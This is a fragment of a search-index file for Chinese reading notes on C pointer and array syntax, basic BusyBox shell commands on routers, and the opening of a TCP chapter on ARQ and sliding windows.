\u4e2a\u5143\u7d20\u7684\u6307\u9488\u7684\u542b\u4e49\uff0c\u65e0\u8bba\u52a0\u4e0d\u52a0[]\uff0c\u5728\u8868\u8fbe\u5f0f\u4e2d\uff0c\u6570\u7ec4\u90fd\u53ef\u4ee5\u88ab\u89e3\u8bfb\u6210\u6307\u9488\u3002 \u987a\u4fbf\u8bf4\u4e00\u4e0b\uff0c\u5bf9\u4e8e\u8fd9\u4e2a\u89c4\u5219\u6765\u8bf4\uff0c\u6709\u4e09\u4e2a\u5c0f\u7684\u4f8b\u5916\uff0c\u6211\u4eec\u4f1a\u5728\u7b2c3\u7ae0\u4f5c\u8be6\u7ec6\u8bf4\u660e\u3002 \u4f60\u53ef\u4ee5\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a\u54d7\u4f17\u53d6\u5ba0\u7684\u5f02\u7aef\u90aa\u8bf4\uff0c\u4f46\u81f3\u5c11\u5728\u8bed\u6cd5\u4e0a\uff0c\u6570\u7ec4\u4e0b\u6807\u8fd0\u7b97\u7b26[]\u548c\u6570\u7ec4\u65e0\u5173\u3002 \u8fd9\u91cc\u4e5f\u662fC\u7684\u6570\u7ec4\u4e0b\u6807\u4ece0\u5f00\u59cb\u7684\u7406\u7531\u4e4b\u4e00\u3002 \u8981\u70b9 \u3010\u975e\u5e38\u91cd\u8981\uff01\uff01\u3011 \u8868\u8fbe\u5f0f\u4e2d\uff0c\u6570\u7ec4\u53ef\u4ee5\u89e3\u8bfb\u6210\u201c\u6307\u5411\u5b83\u7684\u521d\u59cb\u5143\u7d20\u7684\u6307\u9488\u201d\u3002\u5c3d\u7ba1\u6709\u4e09\u4e2a\u5c0f\u4f8b\u5916\uff0c\u4f46\u662f\u8fd9\u548c\u5728\u540e\u9762\u52a0\u4e0d\u52a0[]\u6ca1\u6709\u5173\u7cfb\u3002 \u8981\u70b9 p[i]\u662f*(p + i)\u7684\u7b80\u4fbf\u5199\u6cd5\u3002 \u4e0b\u6807\u8fd0\u7b97\u7b26[]\u539f\u672c\u53ea\u6709\u8fd9\u79cd\u7528\u6cd5\uff0c\u5b83\u548c\u6570\u7ec4\u65e0\u5173\u3002 \u9700\u8981\u5f3a\u8c03\u7684\u662f\uff0c\u8ba4\u4e3a[]\u548c\u6570\u7ec4\u6ca1\u6709\u5173\u7cfb\uff0c\u8fd9\u91cc\u7684[]\u662f\u6307\u5728\u8868\u8fbe\u5f0f\u4e2d\u51fa\u73b0\u7684\u4e0b\u6807\u8fd0\u7b97\u7b26[]\u3002 \u58f0\u660e\u4e2d\u7684[]\uff0c\u8fd8\u662f\u8868\u8fbe\u6570\u7ec4\u7684\u610f\u601d\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u58f0\u660e\u4e2d\u7684[]\u548c\u8868\u8fbe\u5f0f\u4e2d\u7684[] \u610f\u4e49\u5b8c\u5168\u4e0d\u540c \u3002\u8868\u8fbe\u5f0f\u4e2d\u7684*\u548c\u58f0\u660e\u4e2d\u7684*\u7684\u610f\u4e49\u4e5f\u662f\u5b8c\u5168\u4e0d\u540c\u7684\u3002\u8fd9\u4e9b\u73b0\u8c61\u4f7f\u5f97 C\u8bed\u8a00\u7684\u58f0\u660e\u5728\u7406\u89e3\u4e0a\u53d8\u5f97\u66f4\u52a0\u6251\u6714\u8ff7\u79bb\u2026\u2026\u5bf9\u6b64\uff0c\u7b2c3\u7ae0\u5c06\u4f1a\u8fdb\u884c\u8be6\u7ec6\u7684\u8bf4\u660e\u3002 \u6b64\u5916\uff0c\u5982\u679c\u5c06 a + b \u6539\u5199\u6210 b + a\uff0c\u8868\u8fbe\u5f0f\u7684\u610f\u4e49\u6ca1\u6709\u53d1\u751f\u6539\u53d8\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u5c06*(p + i)\u5199\u6210*(i + p)\u3002\u5176\u6b21\uff0c\u56e0\u4e3a p[i]\u662f*(p + i)\u7684\u7b80\u4fbf\u5199\u6cd5\uff0c\u5b9e\u9645\u4e0a\u5b83\u4e5f\u53ef\u4ee5\u5199\u6210i[p]\u3002 \u5f15\u7528\u6570\u7ec4\u5143\u7d20\u7684\u65f6\u5019\uff0c\u901a\u5e38\u6211\u4eec\u4f7f\u7528array[5]\u8fd9\u6837\u7684\u5199\u6cd5\u3002\u5176\u5b9e\uff0c\u5c31\u7b97\u4f60\u5199\u6210 5[array]\uff0c\u8fd8\u662f\u53ef\u4ee5\u6b63\u786e\u5730\u5f15\u7528\u5230\u4f60\u60f3\u8981\u7684\u5143\u7d20\u3002\u53ef\u662f\uff0c\u8fd9\u79cd\u5199\u6cd5\u5b9e\u5728\u592a\u53e6\u7c7b\u4e86\uff0c\u5b83\u4e0d\u80fd\u7ed9\u6211\u4eec\u5e26\u6765\u4efb\u4f55\u597d\u5904\u3002 \u8981\u70b9 p[i]\u53ef\u4ee5\u5199\u6210i[p]\u3002 \u8981\u70b9 \u3010\u6bd4\u4e0a\u9762\u8fd9\u4e2a\u8981\u70b9\u66f4\u91cd\u8981\u7684\u8981\u70b9\u3011 \u4f46\u662f\u522b\u5199\u6210\u90a3\u6837\u3002 \u8be6\u7ec6\u5f97\u4e0d\u9700\u8981\u6211\u518d\u5e9f\u8bdd\u4ec0\u4e48\u4e86...","title":"Page 39"},{"location":"reading_notes/pointer/1/#_2","text":"","title":"\u8865\u5145 \u8bed\u6cd5\u7cd6"},{"location":"reading_notes/pointer/1/#page-42","text":"p[i]\u662f*(p+i)\u7684\u7b80\u5355\u5199\u6cd5\uff0c\u5b9e\u9645\u4e0a\uff0c\u81f3\u5c11\u5bf9\u4e8e\u7f16\u8bd1\u5668\u6765\u8bf4\uff0c[]\u8fd9\u6837\u7684\u8fd0\u7b97\u7b26\u5b8c\u5168\u53ef\u4ee5\u4e0d\u5b58\u5728\u3002 \u53ef\u662f\uff0c\u5bf9\u4e8e\u4eba\u7c7b\u6765\u8bf4\uff0c*(p + i)\u8fd9\u79cd\u5199\u6cd5\u5728\u89e3\u8bfb\u4e0a\u6bd4\u8f83\u56f0\u96be\uff0c\u5199\u8d77\u6765\u4e5f\u9ebb\u70e6\uff08\u952e\u5165\u91cf\u5927\uff09\u3002\u56e0\u6b64\uff0cC\u8bed\u8a00\u5f15\u5165\u4e86[]\u8fd0\u7b97\u7b26\u3002 \u5c31\u50cf\u8fd9\u6837\uff0c\u8fd9\u4e9b\u4ec5\u4ec5\u662f\u4e3a\u4e86\u8ba9\u4eba\u7c7b\u5bb9\u6613\u7406\u89e3\u800c\u5f15\u5165\u7684\u529f\u80fd\uff0c\u7684\u786e\u53ef\u4ee5\u8ba9\u6211\u4eec\u611f\u53d7\u5230\u7f16\u7a0b\u8bed\u8a00\u7684\u751c\u871c\u5473\u9053\uff08\u5bb9\u6613\u7740\u624b\uff09\uff0c\u6709\u65f6\u6211\u4eec\u79f0\u8fd9\u4e9b\u529f\u80fd\u4e3a\u8bed\u6cd5\u7cd6\uff08syntax sugar\u6216\u8005syntactic sugar\uff09\u3002 \u8bed\u6cd5\u7cd6 \u8bed\u6cd5\u76d0","title":"Page 42"},{"location":"reading_notes/routers/1/","text":"1.2 \u8def\u7531\u5668\u7cfb\u7edf\u7684\u57fa\u7840\u77e5\u8bc6\u548c\u5de5\u5177 1.2.2 BusyBox\u547d\u4ee4 \u5728\u8def\u7531\u5668\u7cfb\u7edf\u4e2d\uff0c\u56e0\u4e3a\u5b58\u50a8\u7a7a\u95f4\u53d7\u5230\u9650\u5236\uff0c\u6240\u4ee5\u4f7f\u7528\u7684Shell\u901a\u5e38\u662f\u4e00\u4e2a\u7ecf\u8fc7\u88c1\u526a\u7684\u540d\u4e3aBusyBox\u7684\u7a0b\u5e8f\u3002\u5728\u8def\u7531\u5668\u7cfb\u7edf\u7684Shell\u4e2d\u652f\u6301\u7684\u8fd9\u4e9b\u547d\u4ee4\u5176\u5b9e\u90fd\u6307\u5411BusyBox\u7684\u7b26\u53f7\u94fe\u63a5\u3002 \u4f7f\u7528\u201cbusybox --help\u201d\u547d\u4ee4\u67e5\u770b\u5f53\u524d\u8def\u7531\u5668\u7684BusyBox\u652f\u6301\u7684\u547d\u4ee4\uff0c ls\u547d\u4ee4\uff1a\u663e\u793a\u76ee\u5f55\u53ca\u6587\u4ef6\u4fe1\u606f \u663e\u793a\u6307\u5b9a\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u6216\u6587\u4ef6\u5939 1 ls [ option ][ file|directory ] \u663e\u793a\u5f53\u524d\u76ee\u5f55\u7684\u5185\u5bb9 1 ls \u663e\u793a\u5f53\u524d\u76ee\u5f55\u7684\u8be6\u7ec6\u5185\u5bb9 1 ls - l \u663e\u793a\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6 1 ls - a cd\u547d\u4ee4\uff1a\u6539\u53d8\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55 \u5207\u6362\u5230\u6307\u5b9a\u76ee\u5f55 1 cd [ directory ] \u5207\u6362\u5230\u5f53\u524d\u7528\u6237\u6240\u5728\u7684\u4e3b\u76ee\u5f55 1 cd \u56de\u5230\u5f53\u524d\u76ee\u5f55\u7684\u4e0a\u4e00\u7ea7\u76ee\u5f55 1 cd .. cat\u547d\u4ee4\uff1a\u5728\u6807\u51c6\u8f93\u51fa\u8bbe\u5907\u4e0a\u663e\u793a\u6216\u8fde\u63a5\u6307\u5b9a\u6587\u4ef6 \u663e\u793a\u6587\u4ef6\u7684\u5185\u5bb9\uff08\u7ecf\u5e38\u548cmore\u547d\u4ee4\u642d\u914d\u4f7f\u7528\uff09\uff0c\u6216\u8005\u5c06\u6570\u4e2a\u6587\u4ef6\u5408\u5e76\u6210\u4e00\u4e2a\u6587\u4ef6 1 cat [ option ][ file ] \u663e\u793a\u5f53\u524d\u76ee\u5f55\u4e0b\u7684readme.txt\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u5185\u5bb9 1 cat readme . txt \u5c06face.txt\u6587\u4ef6\u7684\u5185\u5bb9\u9644\u52a0\u5230readme.txt\u6587\u4ef6\u4e4b\u540e 1 cat face . txt >> readme . txt \u5c06n1\u6587\u4ef6\u548cn2\u6587\u4ef6\u5408\u5e76\u6210readme.txt\u6587\u4ef6 1 cat n1 n2 > readme . txt rm\u547d\u4ee4\uff1a\u5220\u9664\u6307\u5b9a\u6587\u4ef6 \u5220\u9664\u6587\u4ef6\u6216\u76ee\u5f55 1 rm [ option ][ file ] \u5220\u9664\u5f53\u524d\u76ee\u5f55\u4e0b\u7684myfile\u6587\u4ef6 1 rm myfile \u5f3a\u5236\u5220\u9664\uff0c\u9047\u5230\u95ee\u9898\u4e0d\u9700\u8981\u786e\u8ba4 1 rm - f * . txt \u9012\u5f52\u5220\u9664/tmp\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\uff0c\u5e76\u5220\u9664/tmp\u76ee\u5f55\uff0c\u7cfb\u7edf\u4f1a\u4e0d\u65ad\u8be2\u95ee\u662f\u5426\u5220\u9664\u6587\u4ef6 1 rm - r / tmp \u5220\u9664/tmp\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\uff0c\u5e76\u5220\u9664/tmp\u76ee\u5f55\uff0c\u9700\u8981\u786e\u8ba4\u662f\u5426\u5220\u9664\u65f6\u9ed8\u8ba4\u9009\u9879\u4e3a\u5220\u9664 1 rm - rf / tmp \u663e\u793a\u5220\u9664\u8fc7\u7a0b 1 rn - v myfile mkdir\u547d\u4ee4\uff1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u521b\u5efa\u65b0\u7684\u5b50\u76ee\u5f55 \u521b\u5efa\u5b50\u76ee\u5f55 1 mkdir [ option ][ directory ] \u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u521b\u5efa\u5b50\u76ee\u5f55tools 1 mkdir tools \u6587\u4ef6\u64cd\u4f5c\u547d\u4ee4\uff1a\u5305\u62ecmv\u3001cp\u3001du \u628areadme.txt\u6587\u4ef6\u590d\u5236\u5230/opt\u76ee\u5f55\u4e0b","title":"\u7b2c1\u7ae0 \u57fa\u7840\u51c6\u5907\u4e0e\u5de5\u5177"},{"location":"reading_notes/routers/1/#12","text":"","title":"1.2 \u8def\u7531\u5668\u7cfb\u7edf\u7684\u57fa\u7840\u77e5\u8bc6\u548c\u5de5\u5177"},{"location":"reading_notes/routers/1/#122-busybox","text":"\u5728\u8def\u7531\u5668\u7cfb\u7edf\u4e2d\uff0c\u56e0\u4e3a\u5b58\u50a8\u7a7a\u95f4\u53d7\u5230\u9650\u5236\uff0c\u6240\u4ee5\u4f7f\u7528\u7684Shell\u901a\u5e38\u662f\u4e00\u4e2a\u7ecf\u8fc7\u88c1\u526a\u7684\u540d\u4e3aBusyBox\u7684\u7a0b\u5e8f\u3002\u5728\u8def\u7531\u5668\u7cfb\u7edf\u7684Shell\u4e2d\u652f\u6301\u7684\u8fd9\u4e9b\u547d\u4ee4\u5176\u5b9e\u90fd\u6307\u5411BusyBox\u7684\u7b26\u53f7\u94fe\u63a5\u3002 \u4f7f\u7528\u201cbusybox --help\u201d\u547d\u4ee4\u67e5\u770b\u5f53\u524d\u8def\u7531\u5668\u7684BusyBox\u652f\u6301\u7684\u547d\u4ee4\uff0c","title":"1.2.2 BusyBox\u547d\u4ee4"},{"location":"reading_notes/routers/1/#ls","text":"\u663e\u793a\u6307\u5b9a\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u6216\u6587\u4ef6\u5939 1 ls [ option ][ file|directory ] \u663e\u793a\u5f53\u524d\u76ee\u5f55\u7684\u5185\u5bb9 1 ls \u663e\u793a\u5f53\u524d\u76ee\u5f55\u7684\u8be6\u7ec6\u5185\u5bb9 1 ls - l \u663e\u793a\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6 1 ls - a","title":"ls\u547d\u4ee4\uff1a\u663e\u793a\u76ee\u5f55\u53ca\u6587\u4ef6\u4fe1\u606f"},{"location":"reading_notes/routers/1/#cd","text":"\u5207\u6362\u5230\u6307\u5b9a\u76ee\u5f55 1 cd [ directory ] \u5207\u6362\u5230\u5f53\u524d\u7528\u6237\u6240\u5728\u7684\u4e3b\u76ee\u5f55 1 cd \u56de\u5230\u5f53\u524d\u76ee\u5f55\u7684\u4e0a\u4e00\u7ea7\u76ee\u5f55 1 cd ..","title":"cd\u547d\u4ee4\uff1a\u6539\u53d8\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55"},{"location":"reading_notes/routers/1/#cat","text":"\u663e\u793a\u6587\u4ef6\u7684\u5185\u5bb9\uff08\u7ecf\u5e38\u548cmore\u547d\u4ee4\u642d\u914d\u4f7f\u7528\uff09\uff0c\u6216\u8005\u5c06\u6570\u4e2a\u6587\u4ef6\u5408\u5e76\u6210\u4e00\u4e2a\u6587\u4ef6 1 cat [ option ][ file ] \u663e\u793a\u5f53\u524d\u76ee\u5f55\u4e0b\u7684readme.txt\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u5185\u5bb9 1 cat readme . txt \u5c06face.txt\u6587\u4ef6\u7684\u5185\u5bb9\u9644\u52a0\u5230readme.txt\u6587\u4ef6\u4e4b\u540e 1 cat face . txt >> readme . txt \u5c06n1\u6587\u4ef6\u548cn2\u6587\u4ef6\u5408\u5e76\u6210readme.txt\u6587\u4ef6 1 cat n1 n2 > readme . txt","title":"cat\u547d\u4ee4\uff1a\u5728\u6807\u51c6\u8f93\u51fa\u8bbe\u5907\u4e0a\u663e\u793a\u6216\u8fde\u63a5\u6307\u5b9a\u6587\u4ef6"},{"location":"reading_notes/routers/1/#rm","text":"\u5220\u9664\u6587\u4ef6\u6216\u76ee\u5f55 1 rm [ option ][ file ] \u5220\u9664\u5f53\u524d\u76ee\u5f55\u4e0b\u7684myfile\u6587\u4ef6 1 rm myfile \u5f3a\u5236\u5220\u9664\uff0c\u9047\u5230\u95ee\u9898\u4e0d\u9700\u8981\u786e\u8ba4 1 rm - f * . txt \u9012\u5f52\u5220\u9664/tmp\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\uff0c\u5e76\u5220\u9664/tmp\u76ee\u5f55\uff0c\u7cfb\u7edf\u4f1a\u4e0d\u65ad\u8be2\u95ee\u662f\u5426\u5220\u9664\u6587\u4ef6 1 rm - r / tmp \u5220\u9664/tmp\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\uff0c\u5e76\u5220\u9664/tmp\u76ee\u5f55\uff0c\u9700\u8981\u786e\u8ba4\u662f\u5426\u5220\u9664\u65f6\u9ed8\u8ba4\u9009\u9879\u4e3a\u5220\u9664 1 rm - rf / tmp \u663e\u793a\u5220\u9664\u8fc7\u7a0b 1 rn - v myfile","title":"rm\u547d\u4ee4\uff1a\u5220\u9664\u6307\u5b9a\u6587\u4ef6"},{"location":"reading_notes/routers/1/#mkdir","text":"\u521b\u5efa\u5b50\u76ee\u5f55 1 mkdir [ option ][ directory ] \u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u521b\u5efa\u5b50\u76ee\u5f55tools 1 mkdir tools","title":"mkdir\u547d\u4ee4\uff1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u521b\u5efa\u65b0\u7684\u5b50\u76ee\u5f55"},{"location":"reading_notes/routers/1/#mvcpdu","text":"\u628areadme.txt\u6587\u4ef6\u590d\u5236\u5230/opt\u76ee\u5f55\u4e0b","title":"\u6587\u4ef6\u64cd\u4f5c\u547d\u4ee4\uff1a\u5305\u62ecmv\u3001cp\u3001du"},{"location":"reading_notes/tcp_ip_illustrated/the_transmission_control_protocol_preliminaries/","text":"12.1 \u5f15\u8a00 \u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u4e00\u76f4\u5728\u8ba8\u8bba\u90a3\u4e9b\u81ea\u8eab\u4e0d\u5305\u542b\u53ef\u9760\u4f20\u9012\u6570\u636e\u673a\u5236\u7684\u534f\u8bae\u3002\u5b83\u4eec\u53ef\u80fd\u4f1a\u4f7f\u7528\u4e00\u79cd\u50cf\u6821\u9a8c\u548c\u6216CRC\u8fd9\u6837\u7684\u6570\u5b66\u51fd\u6570\u6765 \u68c0\u6d4b \u63a5\u6536\u5230\u7684\u6709\u5dee\u9519\u7684\u6570\u636e\uff0c\u4f46\u662f\u5b83\u4eec\u4e0d\u5c1d\u8bd5\u53bb\u7ea0\u6b63\u5dee\u9519\u3002\u5bf9\u4e8eIP\u548cUDP\uff0c\u6839\u672c\u6ca1\u6709\u5b9e\u73b0\u5dee\u9519\u7ea0\u6b63\u3002\u5bf9\u4e8e\u4ee5\u592a\u7f51\u548c\u57fa\u4e8e\u5176\u4e0a\u7684\u5176\u4ed6\u534f\u8bae\uff0c\u534f\u8bae\u63d0\u4f9b\u4e00\u5b9a\u6b21\u6570\u7684\u91cd\u8bd5\uff0c\u5982\u679c\u8fd8\u662f\u4e0d\u6210\u529f\u5219\u653e\u5f03\u3002 \u4f7f\u7528 \u5dee\u9519\u6821\u6b63\u7801 \uff08\u57fa\u672c\u4e0a\u662f\u6dfb\u52a0\u4e00\u4e9b\u5197\u4f59\u7684\u6bd4\u7279\uff0c\u4f7f\u5f97\u5373\u4f7f\u67d0\u4e9b\u6bd4\u7279\u88ab\u6bc1\uff0c\u771f\u5b9e\u7684\u4fe1\u606f\u4e5f\u53ef\u4ee5\u88ab\u6062\u590d\u8fc7\u6765\uff09\u6765\u7ea0\u6b63\u901a\u4fe1\u95ee\u9898\u662f\u5904\u7406\u5dee\u9519\u7684\u4e00\u79cd\u975e\u5e38\u91cd\u8981\u7684\u65b9\u6cd5\u3002\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u7b80\u5355\u5730\u201c\u5c1d\u8bd5\u91cd\u65b0\u53d1\u9001\u201d\uff0c\u76f4\u5230\u4fe1\u606f\u6700\u7ec8\u88ab\u63a5\u6536\u3002\u8fd9\u79cd\u65b9\u6cd5\uff0c\u79f0\u4e3a \u81ea\u52a8\u91cd\u590d\u8bf7\u6c42 \uff08Automatic Repeat Request\uff0cARQ\uff09\uff0c\u6784\u6210\u4e86\u8bb8\u591a\u901a\u4fe1\u534f\u8bae\u7684\u57fa\u7840\uff0c\u5305\u62ecTCP\u5728\u5185\u3002 12.1.2 \u5206\u7ec4\u7a97\u53e3\u548c\u6ed1\u52a8\u7a97\u53e3 \u4e3a\u4e86\u89e3\u51b3\u6240\u6709\u8fd9\u4e9b\u95ee\u9898\uff0c\u6211\u4eec\u4ee5\u5047\u8bbe\u6bcf\u4e2a\u5206\u7ec4\u6709\u4e00\u4e2a\u5e8f\u5217\u53f7\u5f00\u59cb\uff0c\u6b63\u5982\u524d\u9762\u6240\u63cf\u8ff0\u7684\u3002\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u5206\u7ec4 \u7a97\u53e3\uff08window\uff09 \u4f5c\u4e3a\u5df2\u88ab\u53d1\u9001\u65b9\u6ce8\u5165\u4f46\u8fd8\u6ca1\u5b8c\u6210\u786e\u8ba4\uff08\u5982\uff0c\u53d1\u9001\u65b9\u8fd8\u6ca1\u6536\u5230\u8fc7\u5b83\u4eec\u7684ACK\uff09\u7684\u5206\u7ec4\uff08\u6216\u8005\u5b83\u4eec\u7684\u5e8f\u5217\u53f7\uff09\u7684\u96c6\u5408\u3002\u6211\u4eec\u628a\u8fd9\u4e2a\u7a97\u53e3\u4e2d\u7684\u5206\u7ec4\u6570\u91cf\u6210\u4e3a \u7a97\u53e3\u5927\u5c0f\uff08window size\uff09 \u3002\u672f\u8bed \u7a97\u53e3 \u6765\u81ea\u8fd9\u6837\u7684\u60f3\u6cd5\uff1a\u5982\u679c\u4f60\u628a\u5728\u4e00\u4e2a\u901a\u4fe1\u5bf9\u8bdd\u4e2d\u53d1\u9001\u7684\u6240\u6709\u5206\u7ec4\u6392\u6210\u957f\u957f\u7684\u4e00\u884c\uff0c\u4f46\u53ea\u80fd\u901a\u8fc7\u4e00\u4e2a\u5c0f\u5b54\u6765\u89c2\u5bdf\u5b83\u4eec\uff0c\u4f60\u5c31\u53ea\u80fd\u770b\u5230\u5b83\u4eec\u7684\u4e00\u4e2a\u5b50\u96c6\u2014\u2014\u50cf\u901a\u8fc7\u4e00\u4e2a\u7a97\u53e3\u89c2\u770b\u4e00\u6837\u3002\u53d1\u9001\u65b9\u7684\u7a97\u53e3\uff08\u4ee5\u53ca\u5176\u4ed6\u5206\u7ec4\u961f\u5217\uff09\u53ef\u753b\u56fe\u63cf\u8ff0\u6210\u56fe12-1\u90a3\u6837\u3002 \u8fd9\u4e2a\u56fe\u663e\u793a\u4e86\u5f53\u524d\u4e09\u4e2a\u5206\u7ec4\u7684\u7a97\u53e3\uff0c\u6574\u4e2a\u7a97\u53e3\u5927\u5c0f\u662f3\u30023\u53f7\u5206\u7ec4\u5df2\u7ecf\u88ab\u53d1\u9001\u548c\u786e\u8ba4\uff0c\u6240\u4ee5\u7531\u53d1\u9001\u65b9\u4fdd\u5b58\u7684\u5b83\u7684\u526f\u672c\u53ef\u4ee5\u88ab\u91ca\u653e\u3002\u5206\u7ec47\u5728\u53d1\u9001\u65b9\u5df2\u7ecf\u51c6\u5907\u597d\uff0c\u4f46\u8fd8\u6ca1\u88ab\u53d1\u9001\uff0c\u56e0\u4e3a\u5b83\u8fd8\u6ca1\u201c\u8fdb\u5165\u201d\u7a97\u53e3\u3002\u73b0\u5728\u5982\u679c\u6211\u4eec\u60f3\u8c61\u6570\u636e\u5f00\u59cb\u4ece\u53d1\u9001\u65b9\u6d41\u5230\u63a5\u6536\u65b9\uff0cACK\u5f00\u59cb\u4ee5\u76f8\u53cd\u7684\u65b9\u5411\u6d41\u52a8\uff0c\u53d1\u9001\u65b9\u53ef\u80fd\u4e0b\u4e00\u6b65\u5c31\u63a5\u6536\u5230\u4e00\u4e2a\u5206\u7ec44\u7684ACK\u3002\u5f53\u8fd9\u53d1\u751f\u65f6\uff0c\u7a97\u53e3\u5411\u53f3\u8fb9\u201c\u6ed1\u52a8\u201d\u4e00\u4e2a\u5206\u7ec4\uff0c\u610f\u5473\u7740\u5206\u7ec44\u7684\u526f\u672c\u53ef\u4ee5\u91ca\u653e\u4e86\uff0c\u800c\u5206\u7ec47\u53ef\u4ee5\u88ab\u53d1\u9001\u4e86\u3002\u7a97\u53e3\u7684\u8fd9\u79cd\u6ed1\u52a8\u7ed9\u8fd9\u79cd\u7c7b\u578b\u7684\u534f\u8bae\u589e\u52a0\u4e86\u4e00\u4e2a\u540d\u5b57\uff0c \u6ed1\u52a8\u7a97\u53e3\uff08sliding window\uff09 \u534f\u8bae\u3002 12.3 TCP\u5934\u90e8\u548c\u5c01\u88c5 \u56fe12-2\u663e\u793a\u4e86TCP\u5728IP\u6570\u636e\u62a5\u4e2d\u7684\u5c01\u88c5\u3002 \u5934\u90e8\u672c\u8eab\u660e\u663e\u8981\u6bd4\u5728\u7b2c10\u7ae0\u6211\u4eec\u89c1\u8fc7\u7684UDP\u7684\u5934\u90e8\u66f4\u590d\u6742\u3002\u8fd9\u5e76\u4e0d\u5f88\u4ee4\u4eba\u60ca\u8bb6\uff0c\u56e0\u4e3aTCP\u662f\u4e00\u4e2a\u660e\u663e\u8981\u66f4\u590d\u6742\u7684\u534f\u8bae\uff0c\u5b83\u5fc5\u987b\u4fdd\u6301\u8fde\u63a5\u7684\u6bcf\u4e00\u7aef\u77e5\u9053\uff08\u540c\u6b65\uff09\u6700\u65b0\u72b6\u6001\u3002\u5982\u56fe12-3\u6240\u793a\u3002","title":"\u7b2c12\u7ae0 TCP\uff1a\u4f20\u8f93\u63a7\u5236\u534f\u8bae\uff08\u521d\u6b65\uff09"},{"location":"reading_notes/tcp_ip_illustrated/the_transmission_control_protocol_preliminaries/#121","text":"\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u4e00\u76f4\u5728\u8ba8\u8bba\u90a3\u4e9b\u81ea\u8eab\u4e0d\u5305\u542b\u53ef\u9760\u4f20\u9012\u6570\u636e\u673a\u5236\u7684\u534f\u8bae\u3002\u5b83\u4eec\u53ef\u80fd\u4f1a\u4f7f\u7528\u4e00\u79cd\u50cf\u6821\u9a8c\u548c\u6216CRC\u8fd9\u6837\u7684\u6570\u5b66\u51fd\u6570\u6765 \u68c0\u6d4b \u63a5\u6536\u5230\u7684\u6709\u5dee\u9519\u7684\u6570\u636e\uff0c\u4f46\u662f\u5b83\u4eec\u4e0d\u5c1d\u8bd5\u53bb\u7ea0\u6b63\u5dee\u9519\u3002\u5bf9\u4e8eIP\u548cUDP\uff0c\u6839\u672c\u6ca1\u6709\u5b9e\u73b0\u5dee\u9519\u7ea0\u6b63\u3002\u5bf9\u4e8e\u4ee5\u592a\u7f51\u548c\u57fa\u4e8e\u5176\u4e0a\u7684\u5176\u4ed6\u534f\u8bae\uff0c\u534f\u8bae\u63d0\u4f9b\u4e00\u5b9a\u6b21\u6570\u7684\u91cd\u8bd5\uff0c\u5982\u679c\u8fd8\u662f\u4e0d\u6210\u529f\u5219\u653e\u5f03\u3002 \u4f7f\u7528 \u5dee\u9519\u6821\u6b63\u7801 \uff08\u57fa\u672c\u4e0a\u662f\u6dfb\u52a0\u4e00\u4e9b\u5197\u4f59\u7684\u6bd4\u7279\uff0c\u4f7f\u5f97\u5373\u4f7f\u67d0\u4e9b\u6bd4\u7279\u88ab\u6bc1\uff0c\u771f\u5b9e\u7684\u4fe1\u606f\u4e5f\u53ef\u4ee5\u88ab\u6062\u590d\u8fc7\u6765\uff09\u6765\u7ea0\u6b63\u901a\u4fe1\u95ee\u9898\u662f\u5904\u7406\u5dee\u9519\u7684\u4e00\u79cd\u975e\u5e38\u91cd\u8981\u7684\u65b9\u6cd5\u3002\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u7b80\u5355\u5730\u201c\u5c1d\u8bd5\u91cd\u65b0\u53d1\u9001\u201d\uff0c\u76f4\u5230\u4fe1\u606f\u6700\u7ec8\u88ab\u63a5\u6536\u3002\u8fd9\u79cd\u65b9\u6cd5\uff0c\u79f0\u4e3a \u81ea\u52a8\u91cd\u590d\u8bf7\u6c42 \uff08Automatic Repeat Request\uff0cARQ\uff09\uff0c\u6784\u6210\u4e86\u8bb8\u591a\u901a\u4fe1\u534f\u8bae\u7684\u57fa\u7840\uff0c\u5305\u62ecTCP\u5728\u5185\u3002","title":"12.1 \u5f15\u8a00"},{"location":"reading_notes/tcp_ip_illustrated/the_transmission_control_protocol_preliminaries/#1212","text":"\u4e3a\u4e86\u89e3\u51b3\u6240\u6709\u8fd9\u4e9b\u95ee\u9898\uff0c\u6211\u4eec\u4ee5\u5047\u8bbe\u6bcf\u4e2a\u5206\u7ec4\u6709\u4e00\u4e2a\u5e8f\u5217\u53f7\u5f00\u59cb\uff0c\u6b63\u5982\u524d\u9762\u6240\u63cf\u8ff0\u7684\u3002\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u5206\u7ec4 \u7a97\u53e3\uff08window\uff09 \u4f5c\u4e3a\u5df2\u88ab\u53d1\u9001\u65b9\u6ce8\u5165\u4f46\u8fd8\u6ca1\u5b8c\u6210\u786e\u8ba4\uff08\u5982\uff0c\u53d1\u9001\u65b9\u8fd8\u6ca1\u6536\u5230\u8fc7\u5b83\u4eec\u7684ACK\uff09\u7684\u5206\u7ec4\uff08\u6216\u8005\u5b83\u4eec\u7684\u5e8f\u5217\u53f7\uff09\u7684\u96c6\u5408\u3002\u6211\u4eec\u628a\u8fd9\u4e2a\u7a97\u53e3\u4e2d\u7684\u5206\u7ec4\u6570\u91cf\u6210\u4e3a \u7a97\u53e3\u5927\u5c0f\uff08window size\uff09 \u3002\u672f\u8bed \u7a97\u53e3 